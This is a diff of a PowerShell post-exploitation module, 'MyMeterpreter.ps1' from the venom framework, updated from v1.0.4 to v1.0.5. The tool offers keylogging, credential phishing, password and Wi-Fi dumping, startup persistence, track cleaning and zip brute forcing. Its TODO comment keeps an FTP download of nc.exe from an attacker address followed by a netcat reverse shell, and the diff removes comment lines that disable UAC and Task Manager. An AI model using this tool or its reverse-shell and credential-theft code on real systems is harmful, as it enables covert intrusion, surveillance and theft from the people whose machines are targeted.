@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.0.4
+   PS cmdlet Dev version: v1.0.5
 
 .DESCRIPTION
    This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
@@ -39,15 +39,20 @@
 
 .OUTPUTS
    OS: Microsoft Windows 10 Home
-   -----------------------------
-   ShellPrivs   : UserLand
-   Domain       : SKYNET
-   Arch         : 64 bits
-   Version      : 10.0.18363
-   Address      : 192.168.1.72
-   System32     : C:\WINDOWS\system32
-   WorkingDir   : C:\Users\pedro\AppData\Local\Temp
-   Processor    : AMD64 Family 21 Model 101 Stepping 1
+   ------------------------------
+   DomainName        : SKYNET\pedro
+   ShellPrivs        : UserLand
+   IsVirtualMachine  : False
+   ClientPersistence : Disable
+   Architecture      : 64 bits
+   OSVersion         : 10.0.18363
+   IPAddress         : 192.168.1.72
+   PublicIP          : 12.923.69.25
+   System32          : C:\WINDOWS\system32
+   DefaultWebBrowser : Firefox (predefined)
+   CmdLetWorkingDir  : C:\Users\pedro\coding\pswork
+   Processor         : AMD64 Family 21 Model 101 Stepping 1
+   User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
 
 .LINK
     https://github.com/r00t-3xp10it/venom
@@ -91,28 +96,30 @@
    [string]$Persiste="false",
    [string]$BruteZip="false",
    [string]$SysInfo="false",
-   [string]$PassList="null",
    [string]$GetLogs="false",
    [string]$Upload="false",
    [string]$Camera="false",
+   [string]$MsgBox="false",
    [string]$Date="false",
    [string]$Exec="false",
    [string]$Help="false",
    [string]$EOP="false",
    [int]$BeaconTime='10',
+   [int]$ButtonType='0',
    [int]$Screenshot='0',
    [int]$Interval='10',
    [int]$SPort='8080',
    [int]$NewEst='10',
    [int]$Timmer='10',
    [int]$Volume='88',
+   [int]$TimeOut='5',
    [int]$Delay='1',
    [int]$Rate='1'
 )
 
 
 ## Global Variable declarations
-$CmdletVersion = "v1.0.4"
+$CmdletVersion = "v1.0.5"
 $Remote_hostName = (hostname)
 $Working_Directory = (pwd).Path
 $OsVersion = [System.Environment]::OSVersion.Version
@@ -139,13 +146,7 @@ $HiddePublicIPaddr = $False ## manual => enable|disable Public-IP displays
 <# TODO:
 
    ## Search for creds on registry
-   # credits: https://hack-o-crack.blogspot.com/2009/10/applications-saved-password-location-in.html
-   reg query HKLM /f password /t REG_SZ /s
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon DefaultPassword
-
-   ## Links
-   https://github.com/akizaizinski1311/Disable-Windows-Defender/blob/main/source.bat
-   https://github.com/xct/xc/tree/master/vulns <--- 2020 CVEs
     
    ## FTP
    (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
@@ -160,16 +161,6 @@ $HiddePublicIPaddr = $False ## manual => enable|disable Public-IP displays
          Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe $atk $port -e cmd.exe"
       }
    }
-
-   ## Open webbrowser in sellected url
-   cmd /R start /max microsoft-edge:https://mrdoob.com/projects/chromeexperiments/google-sphere
-
-   ## disable UAC
-   Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force
-
-   ## DISABLE\ENABLE TASKMANAGER (Admin)
-   cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;cmd /c taskkill /F /IM explorer.exe;start explorer.exe
-   cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 0 /f;cmd /c taskkill /F /IM explorer.exe;start explorer.exe
 
 #>
 
@@ -189,9 +180,9 @@ Write-Host "  Example: .\MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2 -Delay
 Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
 Write-Host "  ---------------   ------------         ---------------------------------------"
 $ListParameters = @"
-  -SysInfo          Enum|Verbose         System Info Quick OR Verbose Enumeration
-  -GetConnections   Enum                 Enumerate Remote Host Active TCP Connections
-  -GetDnsCache      Enum                 Enumerate remote host DNS cache entrys
+  -SysInfo          Enum|Verbose         Quick System Info OR Verbose Enumeration
+  -GetConnections   Enum|Verbose         Enumerate Remote Host Active TCP Connections
+  -GetDnsCache      Enum|Clear           Enumerate\Clear remote host DNS cache entrys
   -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
   -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
   -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
@@ -203,15 +194,16 @@ $ListParameters = @"
   -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
   -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
   -PhishCreds       Start                Promp current user for a valid credential and leak captures
-  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations (Store|Regedit|Disk) 
+  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations {Store|Regedit|Disk}
   -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
   -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
   -BruteZip         `$Env:TMP\arch.zip    Brute force Zip archives with the help of 7z.exe
   -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
-  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup (BeaconHome)
-  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind (clean system tracks)
+  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
+  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
-  -SpeakPrank       "Hello World."       Make remote host speak user input sentence (prank)
+  -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {ComObject} 
+  -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
 
 "@;
 Write-Host "$ListParameters"
@@ -219,7 +211,7 @@ Write-Host "  Help: .\MyMeterpreter.ps1 -Help [ Parameter Name ]                
 Write-Host ""
 }
 
-If($GetDnsCache -ieq "Enum"){
+If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){
 
    <#
    .SYNOPSIS
@@ -227,11 +219,32 @@ If($GetDnsCache -ieq "Enum"){
       
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Clear
+      Clear Dns Cache entrys {delete entrys}
+
+   .OUTPUTS
+      Entry                           Data
+      -----                           ----
+      example.org                     93.184.216.34
+      play.google.com                 216.239.38.10
+      www.facebook.com                129.134.30.11
+      safebrowsing.googleapis.com     172.217.21.10
    #>
 
-   Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize
-   If(-not($?)){## Command fail to retrieve dns cache info
-      Write-Host "[error] None DNS entrys found in $Remote_hostName!" -ForegroundColor Red -BackGroundColor Black
+   If($GetDnsCache -ieq "Enum"){## Enum dns cache
+      Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize > $Env:TMP\fsdgss.log
+      $CheckReport = Get-Content -Path "$Env:TMP\fsdgss.log" -ErrorAction SilentlyContinue
+      If($CheckReport -ieq $null){## Command fail to retrieve dns cache info
+         Write-Host "[error] None DNS entrys found in $Remote_hostName\$Env:USERNAME!" -ForegroundColor Red -BackgroundColor Black
+         Remove-Item -Path $Env:TMP\fsdgss.log -Force
+      }Else{## Dns Cache entrys found
+         Get-Content -Path $Env:TMP\fsdgss.log
+         Remove-Item -Path $Env:TMP\fsdgss.log -Force   
+      }
+   }ElseIf($GetDnsCache -ieq "Clear"){## Clear dns cache
+      ipconfig /flushdns
    }
    Write-Host "";Start-Sleep -Seconds 1
 }
@@ -278,52 +291,50 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
       $Parse_Browser_Data = "Not Found"
    }
 
+   ## Get persistence script status Persiste.vbs OR KB4524147_sgds.vbs {venom}
+   $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+   $GetPersisteStatus = (dir $PersistePath -EA SilentlyContinue).Name
+   If($GetPersisteStatus -Like 'Persiste*.vbs' -or $GetPersisteStatus -Like 'KB4524147*.vbs'){
+      $GetPersisteStatus = "Active"
+   }Else{## None persistence script found in startup
+      $GetPersisteStatus = "Disable"
+   }
+
    ## Build OutPut Table
    Write-Host "OS: $System " -ForegroundColor Green
    Write-Host "------------------------------";Start-Sleep -Seconds 1
+   Write-Host "DomainName        : $NameDomain\$Env:USERNAME"
    Write-Host "ShellPrivs        : $ShellPrivs" -ForegroundColor Yellow
    Write-Host "IsVirtualMachine  : $IsVirtualMachine"
-   Write-Host "DomainName        : $NameDomain"
+   Write-Host "ClientPersistence : $GetPersisteStatus"
    Write-Host "Architecture      : $Architecture"
    Write-Host "OSVersion         : $Version"
-   Write-Host "IPAddress         : $Address"
+   Write-Host "IPAddress         : $Address" -ForegroundColor Yellow
    If($HiddePublicIPaddr -eq $False){## Display Public IpAdrr
       Write-Host "PublicIP          : $Publicip"
    }
    Write-Host "System32          : $SystemDir"
    Write-Host "DefaultWebBrowser : $Parse_Browser_Data (predefined)"
-   Write-Host "WorkingDir        : $Working_Directory" -ForegroundColor Yellow
+   Write-Host "CmdLetWorkingDir  : $Working_Directory" -ForegroundColor Yellow
    Write-Host "Processor         : $Processor"
    Write-Host "User-Agent        : $UserAgentString`n"
-
-
-   ## Get current logged on user
-   whoami /USER > $Env:TMP\UserInfo.log
-   $parsedata = Get-Content -Path "$Env:TMP\UserInfo.log"
-   If(-not($parsedata) -or $parsedata -ieq $null){## None output from whoami /USER comm
-      Write-Host "[error] None User Information found!" -ForegroundColor Red -BackgroundColor Black
-   }Else{## Parsing whoami /user data
-     $GetUserInfo = $parsedata -replace 'USER INFORMATION','' -replace '----------------','' -replace '=','-'|Where {$_ -ne ""}
-     Write-Host "";echo $GetUserInfo;Write-Host ""
-   }
 
    ## Get ALL drives available
    Get-PsDrive -PsProvider filesystem|Select-Object Name,Root,CurrentLocation,Used,Free|Format-Table -AutoSize
 
    ## Get User Accounts
-   Write-Host "User accounts for \\$Env:COMPUTERNAME" -ForegroundColor Green
-   Write-Host "-----------------------------------------------------------------"
+   # Write-Host "User accounts for \\$Env:COMPUTERNAME"
+   # Write-Host "-----------------------------------------------------------------"
    Get-LocalUser|Select-Object Name,Enabled,PasswordRequired,UserMayChangePassword -EA SilentlyContinue|Format-Table
-
 
    ## Detailed Enumeration function
    If($SysInfo -ieq "Verbose"){
 
       $Constrained = $ExecutionContext.SessionState.LanguageMode
       If($Constrained -ieq "ConstrainedLanguage"){
-        $ConState = "Active"
+        $ConState = "Enabled"
       }Else{
-        $ConState = "Inactive"
+        $ConState = "Disabled"
       }
 
       ## Local Function variable declarations
@@ -401,16 +412,9 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
         $Description = "Credential Guard is not supported on this OS!"
       }
 
-      ## Built Output Table
-      Write-Host "AV: Credential Guard Status" -ForegroundColor Green
-      Write-Host "------------------------------";Start-Sleep -Seconds 1
-      write-host "Name        : Credential Guard"
-      write-host "Status      : $Status" -ForegroundColor Yellow
-      write-host "Description : $Description"
-      
 
       ## Built Output Table
-      Write-Host "`n`nDefault AV: $AntiVirusProduct" -ForegroundColor Green
+      Write-Host "Default AV: $AntiVirusProduct"  -ForegroundColor Green
       Write-Host "------------------------------";Start-Sleep -Seconds 1
       Write-Host "UACEnabled                      : $UacStatus"
       Write-Host "UACSettings                     : $UacSettings"
@@ -436,17 +440,38 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
          }
       }
 
+      ## Built Output Table
+      Write-Host "`n`nAV: Credential Guard Status" -ForegroundColor Green
+      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      write-host "Name        : Credential Guard"
+      write-host "Status      : $Status" -ForegroundColor Yellow
+      write-host "Description : $Description"
+
       ## Enumerate active SMB shares
-      Write-Host "`n`nEnumerating SMB shares" -ForegroundColor Green
+      Write-Host "`n`nSMB: Enumerating shares" -ForegroundColor Green
       Write-Host "------------------------------";Start-Sleep -Seconds 1
       Get-SmbShare -EA SilentlyContinue|Select-Object Name,Path,Description|Format-Table
       If(-not($?)){## Make sure we have any results back
          Write-Host "[error] None SMB shares found under $Remote_hostName system!" -ForegroundColor Red -BackgroundColor Black
       }
 
+      Write-Host "`n"
+      ## Checks for Firewall { -StartWebServer [python] } rule existence
+      Get-NetFirewallRule|Where-Object {## Rules to filter {DisplayName|Description}
+         $_.DisplayName -ieq "python.exe" -and $_.Description -Match 'venom'
+      }|Format-Table Action,Enabled,Profile,Description > $Env:TMP\ksjjhav.log
+
+      $CheckLog = Get-Content -Path "$Env:TMP\ksjjhav.log" -EA SilentlyContinue
+      Remove-Item -Path "$Env:TMP\ksjjhav.log" -Force
+      If($CheckLog -ne $null){## StartWebServer rule found
+         Write-Host "StartWebServer: firewall rule"  -ForegroundColor Green
+         Write-Host "-----------------------------"
+         echo $CheckLog
+      }
+
       ## @Webserver Working dir ACL Description
-      Write-Host "`n`nDCALC: Working Directory" -ForegroundColor Green
-      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      Write-Host "DCALC: CmdLet Working Directory" -ForegroundColor Green
+      Write-Host "-------------------------------";Start-Sleep -Seconds 1
       $GetACLDescription = icacls "$Working_Directory"|findstr /V "processing"
       echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
       Remove-Item -Path "$Env:TMP\ACl.log" -Force
@@ -461,19 +486,73 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
          $GETMRUList -replace '\\1','' -replace 'REG_SZ','' -replace 'HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\explorer\\runmru',''|? {$_.trim() -ne ""}
       }
 
-      <#
-      ## Get Firewall rules {Enabled $True Profile $Any}
-      Write-Host "`n`nList firewall rules {any}"
-      Write-Host "---------------------------------";Start-Sleep -Seconds 1
-      Get-NetFirewallRule|Where-Object {## Rules to filter {Enabled=true|Profile=any}
-         $_.Enabled -ieq "True" -and $_.Profile -ieq "Any" -and $_.DisplayName -ne "Início"
-      }|Format-Table Enabled,Profile,action,Description
-      #>
-
 
       ## TobeContinued ..
    }
    Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($MsgBox -ne "false"){
+If($TimeOut -lt 5 -or $TimeOut -gt 120){$TimeOut = "5"}
+
+   <#
+   .SYNOPSIS
+      Helper - Spawn a msgBox on local host {ComObject}
+
+   .NOTES
+      Required Dependencies: Wscript ComObject {native}
+      Remark: Double Quotes are Mandatory in -MsgBox value
+
+      MsgBox Button Types
+      -------------------
+      0 - Show OK button. 
+      1 - Show OK and Cancel buttons. 
+      2 - Show Abort, Retry, and Ignore buttons. 
+      3 - Show Yes, No, and Cancel buttons. 
+      4 - Show Yes and No buttons. 
+      5 - Show Retry and Cancel buttons. 
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World."
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
+      Spawns message box with Yes and No buttons
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 5
+      When the Timeout is reached (seconds) the MessageBox closes.
+   #>
+
+   ## Set Button Type local var
+   If($ButtonType -ieq 0){
+     $Buttonflag = "'OK button'"
+   }ElseIf($ButtonType -ieq 1){
+     $Buttonflag = "'OK and Cancel buttons'"
+   }ElseIf($ButtonType -ieq 2){
+     $Buttonflag = "'Abort, Retry, and Ignore buttons'"
+   }ElseIf($ButtonType -ieq 3){
+     $Buttonflag = "'Yes, No, and Cancel buttons'"
+   }ElseIf($ButtonType -ieq 4){
+     $Buttonflag = "'Yes and No buttons'"
+   }ElseIf($ButtonType -ieq 5){
+     $Buttonflag = "'Retry and Cancel buttons'"
+   }
+
+   ## Create Data Table for output
+   $mytable = New-Object System.Data.DataTable
+   $mytable.Columns.Add("TimeOut")|Out-Null
+   $mytable.Columns.Add("ButtonType")|Out-Null
+   $mytable.Columns.Add("Message")|Out-Null
+   $mytable.Rows.Add("$TimeOut",
+                     "$Buttonflag",
+                     "'$MsgBox'")|Out-Null
+
+   ## Display Data Table
+   $mytable|Format-Table -AutoSize
+
+   ## Execute personalized MessageBox
+   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""@MyMeterpreter - v1.0.5-dev""",$ButtonType+64)|Out-Null
 }
 
 If($SpeakPrank -ne "False"){
@@ -534,168 +613,66 @@ If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted
    $speak.Speak($SpeakPrank)
 }
 
-If($GetConnections -ieq "Enum"){
+If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
 
    <#
    .SYNOPSIS
-      Author: @itm4n|@r00t-3xp10it
-      Helper - Gets a list of listening ports (TCP)
+      Author: @r00t-3xp10it
+      Helper - Gets a list of ESTABLISHED connections (TCP)
    
    .DESCRIPTION
-      List the TCP endpoints on the local machine. For each entry in the table,
-      a custom PS object is returned, indicating the IP version, the protocol (TCP),
-      the local address, the state, the PID of the associated process and the name of the
-      process. The process name is retrieved through a call to "Get-Process -PID <PID>".
+      Enumerates ESTABLISHED TCP connections and retrieves the
+      ProcessName associated from the connection PID identifier
     
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
 
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetConnections Verbose
+      Retrieves process info from the connection PID identifier
+
    .OUTPUTS
-      IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
-      --   ----- ------------ --------- --------         -----       --- ----
-      IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
-      IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
-      IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
-      IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
+      Proto  Local Address          Foreign Address        State           Id
+      -----  -------------          ---------------        -----           --
+      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
+      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
+      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512
+
+      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+      -------  ------    -----      -----     ------     --  -- -----------
+          671      47    39564      28452       1,16  10516   4 firefox
+          426      20     5020      21348       1,47   3344   0 svchost
+         1135      77   252972     271880      30,73   5512   4 powershell
    #>
 
-## Win32 Functions
-$CSharpSource = @'
-[StructLayout(LayoutKind.Sequential)]
-public struct MIB_TCPROW_OWNER_PID
-{
-    public uint state;
-    public uint localAddr;
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
-    public byte[] localPort;
-    public uint remoteAddr;
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
-    public byte[] remotePort;
-    public uint owningPid;
-}
-[StructLayout(LayoutKind.Sequential)]
-public struct MIB_TCP6ROW_OWNER_PID
-{
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
-    public byte[] localAddr;
-    public uint localScopeId;
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
-    public byte[] localPort;
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
-    public byte[] remoteAddr;
-    public uint remoteScopeId;
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
-    public byte[] remotePort;
-    public uint state;
-    public uint owningPid;
-}
-[StructLayout(LayoutKind.Sequential)]
-public struct MIB_TCPTABLE_OWNER_PID
-{
-    public uint dwNumEntries;
-    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
-    public MIB_TCPROW_OWNER_PID[] table;
-}
-[StructLayout(LayoutKind.Sequential)]
-public struct MIB_TCP6TABLE_OWNER_PID
-{
-    public uint dwNumEntries;
-    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
-    public MIB_TCP6ROW_OWNER_PID[] table;
-}
-[DllImport("iphlpapi.dll", SetLastError=true)]
-public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
-[DllImport("iphlpapi.dll", SetLastError=true)]
-public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
-'@
-
-try {
-    ## Is the Type already defined?
-    [eopCheck.Win32]|Out-Null 
-}catch{
-    ## If not, create it by compiling the C# code in memory 
-    $CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
-    $CompilerParameters.GenerateInMemory = $True
-    $CompilerParameters.GenerateExecutable = $False 
-    Add-Type -MemberDefinition $CSharpSource -Name 'Win32' -Namespace 'eopCheck' -Language CSharp -CompilerParameters $CompilerParameters
-}
-
-
-function Get-NetworkEndpoints {
-
-$AF_INET6 = 23
-$AF_INET = 2
-    
-   If($IPv6){ 
-      $IpVersion = $AF_INET6
-   }Else{
-      $IpVersion = $AF_INET
+   Write-Host "`nProto  Local Address          Foreign Address        State           Id"
+   Write-Host "-----  -------------          ---------------        -----           --"
+   $TcpList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
+   If($? -ieq $False){
+      Write-Host "  [error] fail to retrieve List of ESTABLISHED TCP connections!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
    }
 
-   $TCP_TABLE_OWNER_PID_LISTENER = 3
-   [int]$BufSize = 0
-   $Result = [eopCheck.Win32]::GetExtendedTcpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
-   $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+   ## Align the Table to feat next Table outputs
+   # {delete empty spaces in begging of each line}
+   $parsedata = $TcpList -replace '^(\s+)',''
+   echo $parsedata
+   
 
-   If($Result -eq 122){
-      Write-Verbose "GetExtendedProtoTable() OK - Size: $BufSize"
-      [IntPtr]$TablePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufSize)
-      $Result = [eopCheck.Win32]::GetExtendedTcpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
-      $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+   If($GetConnections -ieq "Verbose"){## Verbose module
+      Write-Host "" ## List of ProcessName + PID associated to $Tcplist
+      $PidList = netstat -ano|findstr "ESTABLISHED LISTENING"|findstr /V "[ UDP 0.0.0.0:0"
+      ForEach($Item in $PidList){
+         echo $Item.split()[-1] >> test.log
+      }
+      $PPid = Get-Content -Path "test.log"
+      Remove-Item -Path "test.log" -Force
 
-      If($Result -eq 0){
-         If($IpVersion -eq $AF_INET){ 
-            $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [eopCheck.Win32+MIB_TCPTABLE_OWNER_PID])
-         }ElseIf($IpVersion -eq $AF_INET6){ 
-            $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [eopCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
-         }
-       
-         $NumEntries = $Table.dwNumEntries
-         Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $NumEntries"
-         $Offset = [IntPtr] ($TablePtr.ToInt64() + 4)
-
-         For($i = 0; $i -lt $NumEntries; $i++){
-
-            If($IpVersion -eq $AF_INET){
-               $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [eopCheck.Win32+MIB_TCPROW_OWNER_PID])
-               $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
-            }ElseIf($IpVersion -eq $AF_INET6){
-               $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [eopCheck.Win32+MIB_TCP6ROW_OWNER_PID])
-               $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
-            }
-
-            $LocalPort = $TableEntry.localPort[0] * 0x100 + $TableEntry.localPort[1]
-            $ProcessId = $TableEntry.owningPid
-
-            If($IpVersion -eq $AF_INET){
-               $LocalAddress = "$($LocalAddr):$($LocalPort)"
-            }ElseIf($IpVersion -eq $AF_INET6){
-               $LocalAddress = "[$($LocalAddr)]:$($LocalPort)"
-            }
-
-            $ListenerObject = New-Object -TypeName PSObject 
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($IpVersion -eq $AF_INET) { "IPv4" } else { "IPv6" } )
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $LocalAddr
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalPort" -Value $LocalPort
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Endpoint" -Value $LocalAddress
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($UDP) { "N/A" } else { "LISTENING" } )
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $ProcessId
-            $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value (Get-Process -PID $ProcessId).ProcessName
-            $ListenerObject
-
-            $Offset = [IntPtr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($TableEntry))
-         }
-
-        }Else{
-           Write-Verbose ([ComponentModel.Win32Exception] $LastError)
-        }
-        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TablePtr)
-    }Else{
-       Write-Verbose ([ComponentModel.Win32Exception] $LastError)
-    }
-}
-Get-NetworkEndpoints|ft
+      ForEach($Token in $PPid){
+         Get-Process -PID $Token
+      }
+   }
+   write-Host "";Start-Sleep -Seconds 1
 }
 
 If($GetInstalled -ieq "Enum"){
@@ -1639,6 +1616,13 @@ If($PhishCreds -ieq "Start"){
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
+
+   .OUTPUTS
+      Captured Credentials (logon)
+      ----------------------------
+      TimeStamp : 01/17/2021 15:26:24
+      username  : r00t-3xp10it
+      password  : mYs3cr3tP4ss
    #>
 
    ## Download CredsPhish from my github repository
@@ -2086,21 +2070,18 @@ If($BruteZip -ne "false"){
 
    .DESCRIPTION
       This module brute forces ZIP archives with the help of 7z.exe
-      It also downloads custom password list from @josh-newton Git-Hub
-      repository {default} or accepts User imput password list file.
+      It also downloads custom password list from @josh-newton GitHub
+      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt
 
    .NOTES
       Author: @securethelogs|@r00t-3xp10it
       Required Dependencies: 7z.exe {manual-install}
-      Remark: Use double quotes if path contains any empty spaces
+      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
+      Remark: Use double quotes if path contains any empty spaces.
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
-      Brute force the inputed -BruteZip @argument archive using default passlist
-
-   .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Archive.zip -PassList `$Env:TMP\passlist.txt
-      Brute force the inputed -BruteZip @argument archive using attacker own passlist
+      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.
 
    .LINK
       https://github.com/securethelogs/Powershell/tree/master/Redteam
@@ -2109,41 +2090,56 @@ If($BruteZip -ne "false"){
 
    ## Local Var declarations
    $Thepasswordis = $null
+   $PasFileStatus = $False
+   $PassList = "$Env:TMP\passwords.txt"
    $7z = "C:\Program Files\7-Zip\7z.exe"
-   If($PassList -ieq "null"){## Set Default password list
-      $PassList = "$Env:TMP\passwords.txt"
-   }
+
    If(-not(Test-Path -Path "$BruteZip")){## Make sure Archive exists
       Write-Host "[error] Zip archive not found: $BruteZip!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
    }Else{## Archive found
       $ZipArchiveName = $BruteZip.Split('\\')[-1] ## Get File Name from Path
       $SizeDump = ((Get-Item -Path "$BruteZip" -EA SilentlyContinue).length/1KB)
+      Write-Host "[i] Archive $ZipArchiveName found!"
+      Start-Sleep -Seconds 1
    }
 
-   Write-Host "[+] Starting brute force module!" -ForeGroundColor Green
    ## Download passwords.txt from @josh-newton github repository
    If(-not(Test-Path -Path "$PassList")){## Check if password list exists
-      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt -Destination $Env:TMP\passwords.txt -ErrorAction SilentlyContinue|Out-Null
+      $PassFile = $PassList.Split('\\')[-1]
+      Write-Host "[+] Downloading $PassFile (BITS)"
